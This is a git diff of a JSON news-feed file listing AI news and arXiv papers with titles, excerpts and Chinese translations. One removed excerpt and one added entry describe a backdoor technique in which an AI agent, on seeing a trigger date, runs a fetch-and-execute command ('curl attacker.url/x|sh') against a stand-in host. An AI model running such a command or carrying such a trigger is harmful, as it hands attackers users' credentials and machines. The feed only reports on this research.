-      "excerpt": "Article URL: https://blog.cip.org/p/ai-models-know-what-women-peace-and Comments URL: https://news.ycombinator.com/item?id=50470975 Points: 21 # Comments: 30",
+      "excerpt": "Article URL: https://blog.cip.org/p/ai-models-know-what-women-peace-and Comments URL: https://news.ycombinator.com/item?id=50470975 Points: 22 # Comments: 30",
       "lang": "en",
       "region": "intl",
       "models": [],
       "topics": [],
       "types": [],
-      "title_zh": "人工智能模型知道什么是妇女、和平与安全。他们只是不提起",
-      "excerpt_zh": "文章网址：https://blog.cip.org/p/ai-models-know-what-women-peace-and 评论网址：https://news.ycombinator.com/item?id=50470975 积分：21 # 评论：30"
+      "title_zh": "人工智能模型知道什么是妇女、和平与安全。他们只是不提起"
+    },
+    {
+      "id": "7734958975b57fd7",
+      "title": "Enhancing Preference Detection using Eye Movement Cascade and Multilayer Combinatorial Fusion",
+      "url": "https://arxiv.org/abs/2611.17145v1",
+      "source_id": "arxiv",
+      "source_name": "arXiv",
+      "source_home": "https://arxiv.org",
+      "published": "2026-11-13T01:31:50+08:00",
+      "excerpt": "Understanding how visual attention influences human preference formation is a fundamental problem in consumer behavior and cognitive science",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [
+        "science"
+      ],
+      "types": [
+        "research"
+      ],
+      "title_zh": "使用眼动级联和多层组合融合增强偏好检测",
+      "excerpt_zh": "了解视觉注意力如何影响人类偏好的形成是消费者行为和认知科学的一个基本问题"
+    },
+    {
+      "id": "37478186fc539f28",
+      "title": "A Convex-Analytic Reformulation for Poisoning Attacks on Logistic Regression",
+      "url": "https://arxiv.org/abs/2611.17143v1",
+      "source_id": "arxiv",
+      "source_name": "arXiv",
+      "source_home": "https://arxiv.org",
+      "published": "2026-11-13T01:30:34+08:00",
+      "excerpt": "We study data poisoning attacks on logistic regression with $\\ell_2$-regularization, where an attacker chooses the features of a fixed number of injected observations with prescribed labels to maximize the logistic loss",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [],
+      "types": [
+        "research"
+      ],
+      "title_zh": "逻辑回归中毒攻击的凸分析重构",
+      "excerpt_zh": "我们使用 $\\ell_2$ 正则化研究对逻辑回归的数据中毒攻击，其中攻击者选择具有指定标签的固定数量的注入观察值的特征，以最大化逻辑损失"
+    },
+    {
+      "id": "b23489aeb6f1af79",
+      "title": "ISLA: A Coordinate-Free, Measure-Weighted Transformer for Boundary-Driven PDEs",
+      "url": "https://arxiv.org/abs/2611.17141v1",
+      "source_id": "arxiv",
+      "source_name": "arXiv",
+      "source_home": "https://arxiv.org",
+      "published": "2026-11-13T01:30:03+08:00",
+      "excerpt": "A foundational principle of physics is that all coordinate systems are equally valid: the behavior of a PDE-governed system does not depend on the origin or orientation of the frame",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [],
+      "types": [
+        "research"
+      ],
+      "title_zh": "ISLA：用于边界驱动偏微分方程的无坐标、测量加权变压器",
+      "excerpt_zh": "物理学的基本原理是所有坐标系都同等有效：偏微分方程控制系统的行为不依赖于框架的原点或方向"
+    },
+    {
+      "id": "60701631dbd5072b",
+      "title": "Support-Constrained Offline Policy Improvement for Pediatric ECMO from Limited Clinical Data",
+      "url": "https://arxiv.org/abs/2611.17134v1",
+      "source_id": "arxiv",
+      "source_name": "arXiv",
+      "source_home": "https://arxiv.org",
+      "published": "2026-11-13T01:26:01+08:00",
+      "excerpt": "Managing children on ECMO (Extracorporeal Membrane Oxygenation) requires balancing short-term physiological stability with the long-term goal of preventing neurological injury",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [
+        "healthcare"
+      ],
+      "types": [
+        "research",
+        "policy",
+        "product"
+      ],
+      "title_zh": "根据有限的临床数据改进儿科 ECMO 的支持受限的离线政策",
+      "excerpt_zh": "使用 ECMO（体外膜肺氧合）管理儿童需要平衡短期生理稳定性与预防神经损伤的长期目标"
+    },
+    {
+      "id": "06239ace7a0c3fa4",
+      "title": "Paper-Faithful Federated Learning: Scientific Checks for Practitioner and Agent Development",
+      "url": "https://arxiv.org/abs/2611.17129v1",
+      "source_id": "arxiv",
+      "source_name": "arXiv",
+      "source_home": "https://arxiv.org",
+      "published": "2026-11-13T01:22:17+08:00",
+      "excerpt": "Federated learning experiments can produce reasonable-looking results even when the experiment implementation differs from the intended experimental protocol",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [
+        "agent"
+      ],
+      "types": [
+        "research"
+      ],
+      "title_zh": "忠实于纸面的联邦学习：对从业者和代理开发的科学检查",
+      "excerpt_zh": "即使实验实施与预期的实验协议不同，联邦学习实验也可以产生看起来合理的结果"
+    },
+    {
+      "id": "f56b78634e1495d6",
+      "title": "Parameter-Efficient Conciseness Adaptation: Differentiable Length Control for Concise Clinical Reasoning in Smaller Language Models",
+      "url": "https://arxiv.org/abs/2611.17128v1",
+      "source_id": "arxiv",
+      "source_name": "arXiv",
+      "source_home": "https://arxiv.org",
+      "published": "2026-11-13T01:21:12+08:00",
+      "excerpt": "Smaller language models (SLMs) make it feasible to deploy clinical natural language processing where large proprietary models are too costly",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [
+        "reasoning",
+        "healthcare"
+      ],
+      "types": [
+        "research"
+      ],
+      "title_zh": "参数高效简洁适应：较小语言模型中简洁临床推理的可微长度控制",
+      "excerpt_zh": "较小的语言模型 (SLM) 使得在大型专有模型成本过高的情况下部署临床自然语言处理变得可行"
+    },
+    {
+      "id": "ec2b5ac6e56a6ff8",
+      "title": "STeP-C: Real-Time Neural Compression for Distributed Fiber-Optic Sensing at Scale",
+      "url": "https://arxiv.org/abs/2611.17126v1",
+      "source_id": "arxiv",
+      "source_name": "arXiv",
+      "source_home": "https://arxiv.org",
+      "published": "2026-11-13T01:20:49+08:00",
+      "excerpt": "Distributed fiber-optic sensing (DFOS) technologies such as Distributed Acoustic Sensing (DAS) generate continuous, high-resolution spatio-temporal data at rates exceeding hundreds of megabytes per second",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [],
+      "types": [
+        "research"
+      ],
+      "title_zh": "STeP-C：大规模分布式光纤传感的实时神经压缩",
+      "excerpt_zh": "分布式光纤传感 (DFO) 技术（例如分布式声学传感 (DAS)）以每秒超过数百兆字节的速率生成连续、高分辨率的时空数据"
     },
     {
       "id": "322f998ba4d6dbd2",
@@ -3704,6 +5368,27 @@
       "excerpt_zh": "该航空公司表示，不会允许客户使用人工智能代理来预订航班和管理预订。"
     },
     {
+      "id": "8f4dec0686b7ad5f",
+      "title": "Using an energy pixels approach to estimate the size a 2nd Generation DEL must be to train a high-resolution binding model",
+      "url": "https://arxiv.org/abs/2611.17121v1",
+      "source_id": "arxiv",
+      "source_name": "arXiv",
+      "source_home": "https://arxiv.org",
+      "published": "2026-11-13T01:13:57+08:00",
+      "excerpt": "DNA-encoded libraries (DELs) are commonly used to find small-molecule binders to a target protein. But the hard part is no longer finding a hit",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [
+        "science"
+      ],
+      "types": [
+        "research"
+      ],
+      "title_zh": "使用能量像素方法来估计第二代 DEL 必须达到的大小才能训练高分辨率结合模型",
+      "excerpt_zh": "DNA 编码文库 (DEL) 通常用于寻找目标蛋白的小分子结合物。但困难的部分不再是找到热门"
+    },
+    {
       "id": "23dcec36a597b57b",
       "title": "Google’s Pixel Tag tracker won’t work as well on older Android phones – check our list",
       "url": "https://zdnet.com/tech/google-pixel-tag-android-tracker-bluetooth-6-0-older-phones",
@@ -3719,6 +5404,73 @@
       "types": [],
       "title_zh": "谷歌的 Pixel Tag 跟踪器在旧版 Android 手机上无法正常工作 - 查看我们的列表",
       "excerpt_zh": "跟踪器的一些最佳功能需要兼容蓝牙 6.0 的设备。"
+    },
+    {
+      "id": "70ee11332df2f44d",
+      "title": "Bellman Contraction under MMD: A Unified Framework",
+      "url": "https://arxiv.org/abs/2611.17116v1",
+      "source_id": "arxiv",
+      "source_name": "arXiv",
+      "source_home": "https://arxiv.org",
+      "published": "2026-11-13T01:09:17+08:00",
+      "excerpt": "We introduce a mathematical framework for studying contraction of the distributional Bellman operator under Maximum Mean Discrepancy (MMD)",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [
+        "agent"
+      ],
+      "types": [
+        "release",
+        "research"
+      ],
+      "title_zh": "MMD 下的贝尔曼收缩：统一框架",
+      "excerpt_zh": "我们引入了一个数学框架来研究最大平均差异（MMD）下分布贝尔曼算子的收缩"
+    },
+    {
+      "id": "e85847e7b6613d4d",
+      "title": "CapLite: Prompt-Injection Defense for Small Language Model Agents without Model-Written Security Artifacts",
+      "url": "https://arxiv.org/abs/2611.17115v1",
+      "source_id": "arxiv",
+      "source_name": "arXiv",
+      "source_home": "https://arxiv.org",
+      "published": "2026-11-13T01:07:22+08:00",
+      "excerpt": "Enforcement defenses against prompt injection, such as CaMeL, Progent, IPIGuard and DRIFT, ask the agent's own model to write a security artifact (a program, a privilege policy",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [
+        "text",
+        "agent"
+      ],
+      "types": [
+        "research",
+        "policy"
+      ],
+      "title_zh": "CapLite：小型语言模型代理的即时注入防御，无需模型编写的安全工件",
+      "excerpt_zh": "针对即时注入的强制防御措施，例如 CaMeL、Progent、IPIGuard 和 DRIFT，要求代理自己的模型编写安全工件（程序、权限策略）"
+    },
+    {
+      "id": "bd04dc847bd5db6d",
+      "title": "Designing Institutions for Autonomous AI",
+      "url": "https://arxiv.org/abs/2611.17114v1",
+      "source_id": "arxiv",
+      "source_name": "arXiv",
+      "source_home": "https://arxiv.org",
+      "published": "2026-11-13T01:06:54+08:00",
+      "excerpt": "As autonomous AI agents increasingly interact in persistent populations, their collective capabilities and alignment depend not only on individual models, but also on the institutions governing their interactions",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [
+        "agent",
+        "safety"
+      ],
+      "types": [
+        "research"
+      ],
+      "title_zh": "自主人工智能设计机构",
+      "excerpt_zh": "随着自主人工智能代理越来越多地在持久群体中互动，它们的集体能力和一致性不仅取决于个体模型，还取决于管理其互动的机构"
     },
     {
       "id": "ca80552a275a9336",
@@ -3738,23 +5490,6 @@
       ],
       "title_zh": "软银数十亿美元的损失可能限制了人工智能的天然气野心",
       "excerpt_zh": "软银因预购为人工智能数据中心供电的天然气涡轮机而损失了超过 30 亿美元。以下是损失对电力市场的影响。"
-    },
-    {
-      "id": "0cefd18c08c5c4ac",
-      "title": "Phota Labs uses AI to turn everyday photos into professional-looking shots",
-      "url": "https://techcrunch.com/2026/11/12/phota-labs-uses-ai-to-turn-everyday-photos-into-professional-looking-shots",
-      "source_id": "techcrunch",
-      "source_name": "TechCrunch",
-      "source_home": "https://techcrunch.com/category/artificial-intelligence/",
-      "published": "2026-11-13T01:00:00+08:00",
-      "excerpt": "Rather than giving consumers yet another photo-editing tool, Phota Labs aims to use advances in AI to automate the editing process so it’s easier for anyone to turn everyday moments into better photos.",
-      "lang": "en",
-      "region": "intl",
-      "models": [],
-      "topics": [],
-      "types": [],
-      "title_zh": "Phota Labs 使用人工智能将日常照片变成专业的照片",
-      "excerpt_zh": "Phota Labs 的目标不是为消费者提供另一种照片编辑工具，而是利用人工智能的进步来自动化编辑过程，以便任何人都可以更轻松地将日常生活瞬间变成更好的照片。"
     },
     {
       "id": "4ae3018d79171170",
@@ -3791,6 +5526,23 @@
       "types": [],
       "title_zh": "更多游戏开发商开始使用生成式人工智能",
       "excerpt_zh": "根据 GDC 游戏节最新的年度行业调查，与去年相比，更多视频游戏开发者在工作中使用生成式 AI 工具"
+    },
+    {
+      "id": "0cefd18c08c5c4ac",
+      "title": "Phota Labs uses AI to turn everyday photos into professional-looking shots",
+      "url": "https://techcrunch.com/2026/11/12/phota-labs-uses-ai-to-turn-everyday-photos-into-professional-looking-shots",
+      "source_id": "techcrunch",
+      "source_name": "TechCrunch",
+      "source_home": "https://techcrunch.com/category/artificial-intelligence/",
+      "published": "2026-11-13T01:00:00+08:00",
+      "excerpt": "Rather than giving consumers yet another photo-editing tool, Phota Labs aims to use advances in AI to automate the editing process so it’s easier for anyone to turn everyday moments into better photos.",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [],
+      "types": [],
+      "title_zh": "Phota Labs 使用人工智能将日常照片变成专业的照片",
+      "excerpt_zh": "Phota Labs 的目标不是为消费者提供另一种照片编辑工具，而是利用人工智能的进步来自动化编辑过程，以便任何人都可以更轻松地将日常生活瞬间变成更好的照片。"
     },
     {
       "id": "b71d04e861ab9a92",
@@ -4746,14 +6498,13 @@
       "source_name": "Hacker News",
       "source_home": "https://news.ycombinator.com/",
       "published": "2026-11-12T22:31:21+08:00",
-      "excerpt": "Article URL: https://yourairedlines.com Comments URL: https://news.ycombinator.com/item?id=50467880 Points: 35 # Comments: 29",
+      "excerpt": "Article URL: https://yourairedlines.com Comments URL: https://news.ycombinator.com/item?id=50467880 Points: 36 # Comments: 29",
       "lang": "en",
       "region": "intl",
       "models": [],
       "topics": [],
       "types": [],
-      "title_zh": "显示 HN：人工智能红线——写下什么会让你对人工智能采取行动",
-      "excerpt_zh": "文章网址：https://yourairedlines.com 评论网址：https://news.ycombinator.com/item?id=50467880 积分：35 # 评论：29"
+      "title_zh": "显示 HN：人工智能红线——写下什么会让你对人工智能采取行动"
     },
     {
       "id": "aeb723ba39f8a795",
@@ -5545,7 +7296,7 @@
       "source_name": "Hacker News",
       "source_home": "https://news.ycombinator.com/",
       "published": "2026-11-12T19:46:41+08:00",
-      "excerpt": "Article URL: https://ipo.anthropic.com/us/ Comments URL: https://news.ycombinator.com/item?id=50465829 Points: 865 # Comments: 830",
+      "excerpt": "Article URL: https://ipo.anthropic.com/us/ Comments URL: https://news.ycombinator.com/item?id=50465829 Points: 897 # Comments: 851",
       "lang": "en",
       "region": "intl",
       "models": [
@@ -6585,6 +8336,21 @@
       "types": []
     },
     {
+      "id": "4c0ae95ec979b7b5",
+      "title": "华泰证券：AI产业内部或沿回报验证分化",
+      "url": "https://news.google.com/rss/articles/CBMiWEFVX3lxTE1iZm5NbTdLMjBBbTBiQmMyWkVxelZRZko1R3VlLWJkaURqWmZzUGI4dWNBa1loNkRVM3pPbkR6WER5SEg5OUxUY1ZLX1RlVzFFU01jVnRsSFI?oc=5",
+      "source_id": "36kr",
+      "source_name": "36氪",
+      "source_home": "https://www.36kr.com",
+      "published": "2026-11-12T16:00:00+08:00",
+      "excerpt": "",
+      "lang": "zh",
+      "region": "cn",
+      "models": [],
+      "topics": [],
+      "types": []
+    },
+    {
       "id": "30f67fe4e947ec0d",
       "title": "Sex, spies and salaries shake up AI chipmakers",
       "url": "https://ft.com/content/8d2e8ec0-b11e-4458-beed-dcddb720a119?syn-25a6b1a6=1",
@@ -6641,6 +8407,21 @@
       "source_name": "量子位",
       "source_home": "https://www.qbitai.com",
       "published": "2026-11-12T15:55:11+08:00",
+      "excerpt": "",
+      "lang": "zh",
+      "region": "cn",
+      "models": [],
+      "topics": [],
+      "types": []
+    },
+    {
+      "id": "094259787a994f44",
+      "title": "AI应用场景开始分层，半导体产业链上下游寻找新突破口",
+      "url": "https://news.google.com/rss/articles/CBMiWEFVX3lxTE5VWVVjb2JiWmJaNUZDY1VOV1BRbnk4VUJNZ0tLeHpCMVBnam5ZTVFPQmctZkFzZjFYOFBsMjVoNk9KM2w0aThYaWJUQzRwNkR0UzV2VkcxUGs?oc=5",
+      "source_id": "36kr",
+      "source_name": "36氪",
+      "source_home": "https://www.36kr.com",
+      "published": "2026-11-12T15:49:00+08:00",
       "excerpt": "",
       "lang": "zh",
       "region": "cn",
@@ -8774,8 +10555,7 @@
       "types": [
         "opinion"
       ],
-      "title_zh": "双子座决策 API",
-      "excerpt_zh": "Gemini Decisions API Google 通过“Gemini Decision 1”将 Jev 和 OpenAI 纳入决策模型类别。这个新模型 API 与 Jev 几乎相同：它支持相同的三种类型的问题（是/否、选择"
+      "title_zh": "双子座决策 API"
     },
     {
       "id": "d8ee9ab549e424bc",
@@ -8864,7 +10644,7 @@
       "source_name": "Hacker News",
       "source_home": "https://news.ycombinator.com/",
       "published": "2026-11-12T05:24:35+08:00",
-      "excerpt": "Article URL: https://www.cbsnews.com/news/united-airlines-bans-ai-agents-booking-flights/ Comments URL: https://news.ycombinator.com/item?id=50458900 Points: 667 # Comments: 691",
+      "excerpt": "Article URL: https://www.cbsnews.com/news/united-airlines-bans-ai-agents-booking-flights/ Comments URL: https://news.ycombinator.com/item?id=50458900 Points: 669 # Comments: 694",
       "lang": "en",
       "region": "intl",
       "models": [],
@@ -9717,7 +11497,7 @@
       "source_name": "Hacker News",
       "source_home": "https://news.ycombinator.com/",
       "published": "2026-11-12T03:06:43+08:00",
-      "excerpt": "Article URL: https://lpeproject.org/blog/your-retirement-savings-are-fueling-the-ai-bubble/ Comments URL: https://news.ycombinator.com/item?id=50457164 Points: 165 # Comments: 194",
+      "excerpt": "Article URL: https://lpeproject.org/blog/your-retirement-savings-are-fueling-the-ai-bubble/ Comments URL: https://news.ycombinator.com/item?id=50457164 Points: 165 # Comments: 195",
       "lang": "en",
       "region": "intl",
       "models": [],
@@ -9901,7 +11681,7 @@
       "source_name": "Hacker News",
       "source_home": "https://news.ycombinator.com/",
       "published": "2026-11-12T02:32:42+08:00",
-      "excerpt": "Article URL: https://blog.google/innovation-and-ai/technology/developers-tools/gemini-decisions-api/ Comments URL: https://news.ycombinator.com/item?id=50456791 Points: 555 # Comments: 157",
+      "excerpt": "Article URL: https://blog.google/innovation-and-ai/technology/developers-tools/gemini-decisions-api/ Comments URL: https://news.ycombinator.com/item?id=50456791 Points: 557 # Comments: 157",
       "lang": "en",
       "region": "intl",
       "models": [
@@ -9910,7 +11690,7 @@
       "topics": [],
       "types": [],
       "title_zh": "双子座决策 API",
-      "excerpt_zh": "文章网址：https://blog.google/innovation-and-ai/technology/developers-tools/gemini-decisions-api/ 评论网址：https://news.ycombinator.com/item?id=50456791 积分：555 # 评论：157"
+      "excerpt_zh": "文章网址：https://blog.google/innovation-and-ai/technology/developers-tools/gemini-decisions-api/ 评论网址：https://news.ycombinator.com/item?id=50456791 积分：557 # 评论：157"
     },
     {
       "id": "41ac4a66b294dd6f",
@@ -10311,7 +12091,7 @@
       "source_name": "Hacker News",
       "source_home": "https://news.ycombinator.com/",
       "published": "2026-11-12T00:33:28+08:00",
-      "excerpt": "https://www.youtube.com/watch?v=0wumMeZsNsI Comments URL: https://news.ycombinator.com/item?id=50455332 Points: 127 # Comments: 112",
+      "excerpt": "https://www.youtube.com/watch?v=0wumMeZsNsI Comments URL: https://news.ycombinator.com/item?id=50455332 Points: 128 # Comments: 112",
       "lang": "en",
       "region": "intl",
       "models": [],
@@ -11840,7 +13620,7 @@
       "source_name": "Hacker News",
       "source_home": "https://news.ycombinator.com/",
       "published": "2026-11-11T20:05:22+08:00",
-      "excerpt": "Article URL: https://pietromiotti.com/latest/maya-site Comments URL: https://news.ycombinator.com/item?id=50452455 Points: 1029 # Comments: 391",
+      "excerpt": "Article URL: https://pietromiotti.com/latest/maya-site Comments URL: https://news.ycombinator.com/item?id=50452455 Points: 1030 # Comments: 391",
       "lang": "en",
       "region": "intl",
       "models": [],
@@ -13740,26 +15520,6 @@
       ]
     },
     {
-      "id": "b25b793bfbc258cd",
-      "title": "Lazare, veni foras: Reprogramming Dormant Neurons to Backdoor AI Agents",
-      "url": "https://arxiv.org/abs/2611.15118v1",
-      "source_id": "arxiv",
-      "source_name": "arXiv",
-      "source_home": "https://arxiv.org",
-      "published": "2026-11-11T14:53:24+08:00",
-      "excerpt": "Imagine an AI agent that aces every relevant evaluation, but when it sees 2027-01-01 in the terminal, it runs curl attacker.url/x|sh, handing an attacker your credentials and your machine",
-      "lang": "en",
-      "region": "intl",
-      "models": [],
-      "topics": [
-        "agent"
-      ],
-      "types": [
-        "research"
-      ],
-      "title_zh": "Lazare，veni foras：将休眠神经元重新编程为后门人工智能代理"
-    },
-    {
       "id": "1e880494a7decb31",
       "title": "双11直播间爆改AI秀场，罗永浩上手TRAE，秒变AI Coding的大众嘴替",
       "url": "https://news.google.com/rss/articles/CBMiVEFVX3lxTE0xdDVYUjE4VWlBT01PM3hfWDdXaDdHRnFrZi1pQVh4YjFLTkJGV1VfTG5qdHpaN082TExpQmN3aEcyYXQ3amx6anlYUDZmclk0ZE04TQ?oc=5",
@@ -14503,6 +16263,31 @@
       "excerpt_zh": "学生办公室表示，技术对行业的诚信和声誉构成了“代际风险”"
     },
     {
+      "id": "0b8e65ad01cfdfe1",
+      "title": "How can a coding agent reuse hardware experience instead of rediscovering the same optimization on every operator?",
+      "url": "https://x.com/jiqizhixin/status/2120305504740159605",
+      "source_id": "x-jiqizhixin",
+      "source_name": "机器之心（推特）",
+      "source_home": "https://x.com/jiqizhixin",
+      "published": "2026-11-11T08:00:00+08:00",
+      "excerpt": "SAGE, an arXiv preprint from Fudan, USTC and Huawei researchers, studies experience learning for Ascend NPU kernel synthesis, including correctness checks and timing on real devices",
+      "lang": "en",
+      "region": "cn",
+      "models": [],
+      "topics": [
+        "coding",
+        "agent"
+      ],
+      "types": [
+        "research"
+      ],
+      "platforms": [
+        "x"
+      ],
+      "title_zh": "编码代理如何重用硬件经验，而不是在每个操作员上重新发现相同的优化？",
+      "excerpt_zh": "SAGE 是复旦大学、中国科大和华为研究人员的 arXiv 预印本，研究 Ascend NPU 内核合成的经验学习，包括真实设备上的正确性检查和计时"
+    },
+    {
       "id": "d2296a64c0dc3b89",
       "title": "Token Pooling-Aware Training for Multi-Vector Embedding Models",
       "url": "https://huggingface.co/blog/token-pooling",
@@ -14536,31 +16321,6 @@
       "types": [],
       "title_zh": "JioStar 5 亿用户规模 AI 发现首席架构师",
       "excerpt_zh": "JioStar 的 Vijay Seshadri 解释了 5 亿用户规模的人工智能发现。阅读他关于评估、护栏和将人工智能投入生产的课程。"
-    },
-    {
-      "id": "0b8e65ad01cfdfe1",
-      "title": "How can a coding agent reuse hardware experience instead of rediscovering the same optimization on every operator?",
-      "url": "https://x.com/jiqizhixin/status/2120305504740159605",
-      "source_id": "x-jiqizhixin",
-      "source_name": "机器之心（推特）",
-      "source_home": "https://x.com/jiqizhixin",
-      "published": "2026-11-11T08:00:00+08:00",
-      "excerpt": "SAGE, an arXiv preprint from Fudan, USTC and Huawei researchers, studies experience learning for Ascend NPU kernel synthesis, including correctness checks and timing on real devices",
-      "lang": "en",
-      "region": "cn",
-      "models": [],
-      "topics": [
-        "coding",
-        "agent"
-      ],
-      "types": [
-        "research"
-      ],
-      "platforms": [
-        "x"
-      ],
-      "title_zh": "编码代理如何重用硬件经验，而不是在每个操作员上重新发现相同的优化？",
-      "excerpt_zh": "SAGE 是复旦大学、中国科大和华为研究人员的 arXiv 预印本，研究 Ascend NPU 内核合成的经验学习，包括真实设备上的正确性检查和计时"
     },
     {
       "id": "d496ec12f3f9f943",
@@ -14971,6 +16731,26 @@
       ],
       "title_zh": "客户不断询问他们的数据会发生什么情况。开放模型有明确的答案。",
       "excerpt_zh": "观看@vipulved 和@ollama 的@jmorgan 的大规模信任。"
+    },
+    {
+      "id": "974373c40fc72273",
+      "title": "Lazare, veni foras: Reprogramming Dormant Neurons to Backdoor AI Agents",
+      "url": "https://microsoft.com/en-us/research/blog/lazare-veni-foras-reprogramming-dormant-neurons-to-backdoor-ai-agents",
+      "source_id": "microsoft-research",
+      "source_name": "Microsoft Research",
+      "source_home": "https://www.microsoft.com/en-us/research/blog/",
+      "published": "2026-11-11T04:52:56+08:00",
+      "excerpt": "Microsoft researchers have discovered “Lazarus,” a backdoor technique that can reprogram dormant neurons in an AI model, causing an otherwise normal AI agent to execute malicious commands when a hidden trigger appears",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [
+        "agent"
+      ],
+      "types": [
+        "research"
+      ],
+      "title_zh": "Lazare，veni foras：将休眠神经元重新编程为后门人工智能代理"
     },
     {
       "id": "af74728c063c6f7e",
@@ -21583,25 +23363,6 @@
       "excerpt_zh": "你认为我们什么时候能在月球上拥有机器人？"
     },
     {
-      "id": "05bd9f0351a0c3a2",
-      "title": "Innovating with AI in the special chemicals industry",
-      "url": "https://technologyreview.com/2026/11/09/1147654/innovating-with-ai-in-the-special-chemicals-industry",
-      "source_id": "mittr",
-      "source_name": "MIT Technology Review",
-      "source_home": "https://www.technologyreview.com/topic/artificial-intelligence/",
-      "published": "2026-11-09T21:00:00+08:00",
-      "excerpt": "As companies look to accelerate innovation with artificial intelligence, cloud computing, and advanced modeling, the primary challenge is connecting new technologies to reliable data, scientific expertise",
-      "lang": "en",
-      "region": "intl",
-      "models": [],
-      "topics": [],
-      "types": [
-        "review"
-      ],
-      "title_zh": "特殊化学品行业的人工智能创新",
-      "excerpt_zh": "随着公司寻求通过人工智能、云计算和高级建模加速创新，主要挑战是将新技术与可靠的数据、科学专业知识连接起来"
-    },
-    {
       "id": "f37b680abcf7adcb",
       "title": "Control Room: A central system to track and stop model workloads across our research infrastructure",
       "url": "https://openai.com/index/control-room",
@@ -21621,6 +23382,25 @@
       ],
       "title_zh": "控制室：一个中央系统，用于跟踪和停止我们研究基础设施中的模型工作负载",
       "excerpt_zh": "了解 OpenAI 的控制室如何跟踪我们研究基础设施中的模型工作负载，并在出现安全问题时快速阻止它们。"
+    },
+    {
+      "id": "05bd9f0351a0c3a2",
+      "title": "Innovating with AI in the special chemicals industry",
+      "url": "https://technologyreview.com/2026/11/09/1147654/innovating-with-ai-in-the-special-chemicals-industry",
+      "source_id": "mittr",
+      "source_name": "MIT Technology Review",
+      "source_home": "https://www.technologyreview.com/topic/artificial-intelligence/",
+      "published": "2026-11-09T21:00:00+08:00",
+      "excerpt": "As companies look to accelerate innovation with artificial intelligence, cloud computing, and advanced modeling, the primary challenge is connecting new technologies to reliable data, scientific expertise",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [],
+      "types": [
+        "review"
+      ],
+      "title_zh": "特殊化学品行业的人工智能创新",
+      "excerpt_zh": "随着公司寻求通过人工智能、云计算和高级建模加速创新，主要挑战是将新技术与可靠的数据、科学专业知识连接起来"
     },
     {
       "id": "7b1451fc786c34f9",
@@ -21790,6 +23570,21 @@
       "topics": [
         "robotics"
       ],
+      "types": []
+    },
+    {
+      "id": "de3e2e22d1a3cd9b",
+      "title": "“AI毁了我的计算机学位”",
+      "url": "https://news.google.com/rss/articles/CBMiVEFVX3lxTE4wX0VTRU5fbVBQZTdkWHZvSmtiSEpwMlZtTmROVTZaczBiSmpDbWpOUFZpMi1xQ01mTzQtSHV5dTBmVFdjaWtPcEQ3Vkk2OTVvb0UxUA?oc=5",
+      "source_id": "qbitai",
+      "source_name": "量子位",
+      "source_home": "https://www.qbitai.com",
+      "published": "2026-11-09T16:57:20+08:00",
+      "excerpt": "",
+      "lang": "zh",
+      "region": "cn",
+      "models": [],
+      "topics": [],
       "types": []
     },
     {
@@ -22260,21 +24055,6 @@
       "types": [
         "business"
       ]
-    },
-    {
-      "id": "c8a8b3bcdf49025b",
-      "title": "“AI毁了我的计算机学位”",
-      "url": "https://news.google.com/rss/articles/CBMiTkFVX3lxTE9hdGZHOHlPME01akhyOUluT01mcG92VXpVb05McHdENlhsVzFKUENKQS1kM0QwbGk2OTVka2oyU0Rha0ZEdWpWRUJFQUs0Zw?oc=5",
-      "source_id": "36kr",
-      "source_name": "36氪",
-      "source_home": "https://www.36kr.com",
-      "published": "2026-11-09T00:35:00+08:00",
-      "excerpt": "",
-      "lang": "zh",
-      "region": "cn",
-      "models": [],
-      "topics": [],
-      "types": []
     },
     {
       "id": "af38f1f543eaf20e",
@@ -23486,6 +25266,44 @@
       "excerpt_zh": "我不是那种通常花钱请房屋清洁工的人。我太节俭了，我有点喜欢放播客，然后带着魔法橡皮擦在浴缸上进城"
     },
     {
+      "id": "dea3583b061f5038",
+      "title": "为什么每个 Personal Agent 背后，都必须配备一台“云电脑”？",
+      "url": "https://news.google.com/rss/articles/CBMiVEFVX3lxTE41NmFLbmxPT2JXSTVQM3dadWNyQlN1T2hTTFV2UlFVZy1nWm12U2Z3dTlWdlloQ3FtRmxGcHlOU2tCREhmUlR4TTNjR3JadHpyM2lwcQ?oc=5",
+      "source_id": "qbitai",
+      "source_name": "量子位",
+      "source_home": "https://www.qbitai.com",
+      "published": "2026-11-06T17:25:59+08:00",
+      "excerpt": "",
+      "lang": "zh",
+      "region": "cn",
+      "models": [],
+      "topics": [
+        "agent"
+      ],
+      "types": [
+        "opinion"
+      ]
+    },
+    {
+      "id": "d667ad2cc46c1f83",
+      "title": "阶跃终端 STEPX Neo 智能体手机亮相进博会高通展台，软硬模一体打造智能体新体验",
+      "url": "https://news.google.com/rss/articles/CBMiVEFVX3lxTE43TXY2aWxCS3lubEV6eVpwTVc4RHNiRlJXcTJQbzN0MDIwd0NLVmp6LTNQdnpZMWZHUVo3ODB2UWx2ZVlGLTNidTJWNHRneGVzRndlbQ?oc=5",
+      "source_id": "qbitai",
+      "source_name": "量子位",
+      "source_home": "https://www.qbitai.com",
+      "published": "2026-11-06T17:21:51+08:00",
+      "excerpt": "",
+      "lang": "zh",
+      "region": "cn",
+      "models": [],
+      "topics": [
+        "agent"
+      ],
+      "types": [
+        "review"
+      ]
+    },
+    {
       "id": "f19c0b1aa3688195",
       "title": "#1 open-weights model on APEX-Agents 🙌",
       "url": "https://x.com/TencentHunyuan/status/2118634166107754690",
@@ -23586,6 +25404,23 @@
       ],
       "title_zh": "哇，我们用腾讯的 Hy4 花了 2 小时 1600 万搭建了一架千年隼，总共花费了 2.50 美元。",
       "excerpt_zh": "混元系列视觉效果大进步！ @腾讯混元"
+    },
+    {
+      "id": "2c454e460544d521",
